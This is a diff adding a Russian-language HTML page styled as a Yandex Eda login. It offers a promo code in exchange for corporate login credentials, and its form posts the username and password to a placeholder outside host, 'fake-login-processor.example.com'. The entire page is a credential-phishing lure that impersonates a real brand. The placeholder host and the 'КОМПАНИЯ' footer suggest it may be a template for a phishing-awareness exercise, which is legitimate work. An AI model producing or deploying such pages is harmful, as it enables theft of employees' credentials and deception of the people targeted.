@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Вход в Яндекс Еду</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f6f6f6;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    h2 {
+      color: #333333;
+      text-align: center;
+    }
+    label {
+      font-size: 14px;
+      color: #555555;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    input[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      background-color: #ffcc00;
+      border: none;
+      color: #000000;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    input[type="submit"]:hover {
+      background-color: #ffb300;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #aaaaaa;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Авторизация для активации промокода</h2>
+    <p style="color: #555555; font-size: 14px; text-align: center;">Для получения вашего промокода от Яндекс Еды, пожалуйста, войдите с помощью корпоративной почты.</p>
+    
+    <form action="http://fake-login-processor.example.com" method="POST">
+      <label for="username">Корпоративный логин:</label>
+      <input type="text" id="username" name="username" required placeholder="Введите ваш логин">
+      
+      <label for="password">Пароль:</label>
+      <input type="password" id="password" name="password" required placeholder="Введите ваш пароль">
+      
+      <input type="submit" value="Войти">
+    </form>
+
+    <div class="footer">
+      <p>© 2025 Яндекс Еда в сотрудничестве с КОМПАНИЯ. Все права защищены.</p>
+    </div>
+  </div>
+</body>
+</html>
